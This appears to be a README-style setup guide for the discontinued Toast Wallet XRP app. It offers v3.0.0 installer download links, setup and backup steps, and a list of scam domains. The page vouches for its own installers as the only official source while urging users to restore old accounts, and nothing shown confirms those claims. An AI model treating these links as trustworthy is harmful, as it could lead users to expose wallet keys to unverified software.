<div align="center">

# How to Set Up and Use Toast Wallet in 2026 (Legacy User Guide)

**A legacy setup guide for installing and using Toast Wallet today.**

![Docs](https://img.shields.io/badge/DOCS-toast--wallet--docs-555555?style=for-the-badge) [![GitHub Org](https://img.shields.io/badge/GITHUB-Toast--Wallet-6f42c1?style=for-the-badge)](https://github.com/Toast-Wallet) ![License](https://img.shields.io/badge/LICENSE-GPL--2.0-97ca00?style=for-the-badge) ![Release](https://img.shields.io/badge/RELEASE-v3.0.0-0078D6?style=for-the-badge)

</div>

---

## 📥 Downloads — v3.0.0

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) [![Download for macOS](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-MACOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-LINUX-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage)

</div>

| Platform | Requirements | File | Checksum |
|---|---|---|---|
| 🪟 Windows | Windows desktop (64-bit) | [ToastWallet.Setup.3.0.0.exe](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-windows.sha256) |
| 🍎 macOS | macOS desktop | [ToastWallet-3.0.0.dmg](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-macos.sha256) |
| 🐧 Linux | Most modern 64-bit distributions, no install needed | [ToastWallet-3.0.0-x86_64.AppImage](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-linux.sha256) |

Verify your download against the matching SHA256 file before running any installer — all files
and checksums are also listed together on the
[**official v3.0.0 release page**](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> ⚠️ **This GitHub organization is the only official presence for Toast Wallet — there is no official website.**
> `toastwallet.app` is a known phishing clone impersonating one; see our [full scam warning list](./toast-wallet-scam-warning-list.md).

---

Toast Wallet is no longer in active development, so we generally don't recommend it as your
primary wallet going forward — but if you need to set it up to access or migrate an existing
account, here's how, using only official sources.

**Download only from official sources.** Use the
[official GitHub releases](https://github.com/Toast-Wallet/core/releases/tag/3.0.0) directly:
- **Windows:** `ToastWallet.Setup.3.0.0.exe`
- **Mac:** `ToastWallet-3.0.0.dmg`

Do not download Toast Wallet from any app store today — the original team withdrew the app from
app stores in 2020, and anything currently listed under a similar name in an app store is very
likely the ["Toast Plus" fraudulent app](./toast-plus-app-scam.md), not the real thing. See our
[full platform breakdown](./toast-wallet-by-platform.md) for Linux, Android, and iOS
options.

**First-time setup:**
1. Install and open the app.
2. Choose to create a new wallet (or restore an existing one — see our
   [recovery guide](./how-to-recover-xrp-toast-wallet.md) if you're bringing in an old account).
3. Set a 6-digit PIN — this locks the app locally on this device.
4. Set a passphrase — this is required later to authorize transactions. Make it strong (Toast
   Wallet requires 8+ characters with a mix of case, a number, and a special character) and store
   it somewhere durable, not just memory.
5. **Immediately back up your wallet** from the settings menu once you've added any address. This
   produces your backup code — save it somewhere safe and durable (a password manager, or printed
   and stored physically). Losing this is the single biggest cause of permanently inaccessible
   funds, as documented across
   [our recovery troubleshooting guides](./forgot-toast-wallet-passphrase.md).
6. Write down your 6-word recovery phrase and store it separately from your passphrase.

**Basic usage:**
- **Receiving XRP:** share your wallet's public address (never your secret key or backup code)
  with whoever is sending to you.
- **Sending XRP:** paste the recipient's address carefully, include a destination tag if the
  recipient requires one (see [our guide](./toast-wallet-destination-tag.md)), and confirm with
  your passphrase.
- **Ongoing backups:** re-back up your wallet any time you add a new address, change your
  passphrase, or change your PIN — Toast Wallet will prompt you when this is needed.

Given the app's discontinued status, we recommend treating any new setup as a temporary step toward
migrating to an actively maintained wallet — see our
[Xaman migration guide](./migrate-toast-wallet-to-xaman.md).

---

## ⚠️ Known Scams — Do Not Use These

- **The fake "Toast Plus" wallet app** — not affiliated with Toast Wallet, tied to over **$5M in stolen XRP** and a class-action lawsuit against Apple. See: [The Toast Plus App Scam](./toast-plus-app-scam.md).
- **The toastwallet.app phishing clone** — mimics the real recovery page to steal imported wallets. See: [Toast Wallet Phishing Sites](./toast-wallet-phishing-sites.md).
- **SEO clone sites impersonating Toast Wallet** — `xrp-toastwallet.com`, `toast-wallet.com`, `en-toastwallet.com`, `toast-wallet.net`.
- **Follow-up "recovery for a fee" scams** targeting people who already lost funds — never legitimate.

Complete list: [Toast Wallet Scam Alert: Full Warning List](./toast-wallet-scam-warning-list.md). To report a scam, visit [ic3.gov](https://www.ic3.gov).

## Related Articles

- [Toast Wallet by Platform](./toast-wallet-by-platform.md)
- [How to Recover XRP From an Old Toast Wallet](./how-to-recover-xrp-toast-wallet.md)
- [How to Migrate to Xaman Safely](./migrate-toast-wallet-to-xaman.md)
